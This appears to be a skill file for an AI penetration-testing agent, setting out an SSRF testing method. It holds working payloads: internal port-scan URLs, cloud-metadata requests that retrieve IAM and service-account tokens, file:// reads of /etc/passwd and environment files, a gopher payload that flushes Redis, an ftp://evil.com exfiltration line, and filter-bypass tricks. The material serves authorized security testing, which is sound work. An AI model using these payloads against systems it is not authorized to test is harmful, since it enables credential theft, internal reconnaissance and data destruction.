---
name: cypher-ssrf
description: Server-Side Request Forgery testing methodology covering internal port scanning, cloud metadata exfiltration, protocol smuggling, DNS rebinding, and blind SSRF confirmation via OOB callbacks.
version: 0.1.0
owasp: [A10:2021-SSRF]
cwe: [CWE-918]
finding_types: [PARAMETER, VULN_CANDIDATE, EXPLOIT_RESULT, OOB_CALLBACK]
destructiveness: medium
tags: [web, ssrf, cloud, internal-network]
---

# Cypher SSRF Skill

Use this skill when the application accepts a URL, hostname, IP, or file path that it fetches server-side: webhooks, image proxy, PDF generator, file import, API connectors, web scrapers, link previews.

## Detection

1. Identify every parameter that accepts a URL or hostname:
   - URL parameters: `?url=`, `?redirect=`, `?proxy=`, `?fetch=`, `?path=`, `?file=`
   - Webhook URLs, callback URLs, import-URL fields
   - Image proxy: `?img=`, `?src=`, `?image_url=`
   - PDF/renderers: any URL that triggers document generation
   - File include: `?template=`, `?include=`, `?page=`
   - API connectors, feed readers, link preview widgets
2. Test with a URL pointing to a controlled server (or the project DNSLog/OOB callback server):
   ```
   http://<dnslog-host>/ssrf-test-<random>
   ```
3. Confirm the server fetches the URL by observing DNS lookup or HTTP callback.
4. Map which protocols the client library supports: HTTP, HTTPS, FTP, file, gopher, dict, LDAP.

## Internal port scanning

Use the SSRF to probe internal services:

```
http://127.0.0.1:22/
http://127.0.0.1:80/
http://127.0.0.1:3306/
http://127.0.0.1:6379/
http://127.0.0.1:8080/
http://127.0.0.1:9200/
http://127.0.0.1:27017/
```

- Differentiate port states by response timing, error messages, or response size.
- If the response body is returned, map internal services and versions.
- Test common internal targets: `169.254.169.254` (AWS), `metadata.google.internal` (GCP), `169.254.169.254` (Azure).

## Cloud metadata exfiltration

### AWS (IMDSv1)
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
http://169.254.169.254/latest/user-data/
```

### AWS (IMDSv2 — requires token)
```
PUT http://169.254.169.254/latest/api/token
Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
→ then GET with header X-aws-ec2-metadata-token: <token>
```
May not be reachable if the SSRF client only supports GET. Test GET-only anyway — some misconfigurations allow v1 access.

### GCP
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Header: Metadata-Flavor: Google
```
GCP blocks requests without the Metadata-Flavor header — but some HTTP clients strip custom headers, making GCP metadata harder to reach.

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
Header: Metadata: true
```

### DigitalOcean, Oracle Cloud, Alibaba Cloud
```
http://169.254.169.254/metadata/v1.json (DigitalOcean)
http://169.254.169.254/opc/v1/instance/ (Oracle)
http://100.100.100.200/latest/meta-data/ (Alibaba)
```

## Protocol smuggling

When the SSRF client uses a permissive HTTP library:

- **file://**: `file:///etc/passwd`, `file:///proc/self/environ`, `file:///app/.env`
- **gopher://**: `gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a` (raw Redis commands), `gopher://127.0.0.1:25/_...` (SMTP)
- **dict://**: `dict://127.0.0.1:6379/info` (Redis), `dict://127.0.0.1:11211/stats` (Memcached)
- **ftp://**: `ftp://evil.com/file` — can be used for credential exfiltration (some FTP clients send auth even for anonymous)

## Bypass techniques

### IP representation tricks
- Decimal IP: `http://2130706433/` (127.0.0.1 = 2130706433)
- Octal: `http://0177.0.0.1/`
- Hex: `http://0x7f.0x0.0x0.0x1/`
- IPv6: `http://[::1]/`, `http://[::ffff:127.0.0.1]/`
- Mixed: `http://127.0.0.1.xip.io/`, `http://1.1.1.1.nip.io/` (resolves to 1.1.1.1)

### URL parser confusion
- `http://expected-host@127.0.0.1/` — credentials part before @ bypasses hostname check
- `http://127.0.0.1#@expected-host/` — fragment confusion
- `http://expected-host%00@127.0.0.1/` — null byte in userinfo
- `http://127.0.0.1/` with `Host: internal-service` header
- Redirect-based: point to an attacker-controlled server that 302-redirects to `127.0.0.1`

### DNS rebinding
- `http://<random>.rbndr.us/` — resolves alternately to attacker IP and 127.0.0.1
- Configure the project's own domain with a very short TTL that toggles A records

## Blind SSRF confirmation

When the response does not directly echo the fetched content:

1. **DNS lookup**: Use a unique subdomain of the DNSLog/OOB callback server — the DNS query confirms the server resolved your hostname.
2. **HTTP callback**: Use `http://<dnslog-host>/ping-<random>` — the HTTP request confirms the server made an outbound connection.
3. **Timing**: Compare response time for `http://127.0.0.1:<open-port>/` vs `http://127.0.0.1:<closed-port>/`.
4. **Error differentiation**: Some servers reveal internal service banners in error messages.

## Evidence rules

- Save all SSRF probe URLs and their responses to `/mnt/project/exploit/ssrf-<param>/`.
- Capture cloud metadata or internal service responses as evidence files.
- Document the exact bypass technique used if URL filtering was defeated.
- For blind SSRF, save the OOB callback log showing the incoming request.

## Prefix examples

```text
[cypher:finding type=VULN_CANDIDATE confidence=0.82 severity=high tags=web,ssrf artifacts=/mnt/project/exploit/ssrf-webhook/ cleanup=none] The `callback_url` parameter in POST /hooks/new fetches arbitrary URLs; confirmed via DNS callback on test probe. Internal probing not yet performed.
```

```text
[cypher:finding type=EXPLOIT_RESULT confidence=0.98 severity=critical tags=web,ssrf,cloud artifacts=/mnt/project/exploit/ssrf-webhook/metadata-iam.json cleanup=none] SSRF on /hooks/new?callback_url= recovers AWS IMDSv1 IAM credentials for `ec2-readonly` role. Token valid at time of extraction.
```

## Common false positives

- DNS lookup hits the project's outbound DNS but the server never establishes an HTTP/TCP connection to the target.
- The URL appears in an error message but was never fetched (string echo, not SSRF).
- The request is made client-side (CORS != SSRF) — verify the server IP, not the client IP, is the source.
- The server only fetches to a hardcoded domain but the parameter controls a path — this is path traversal, not SSRF (lower severity, different finding type).
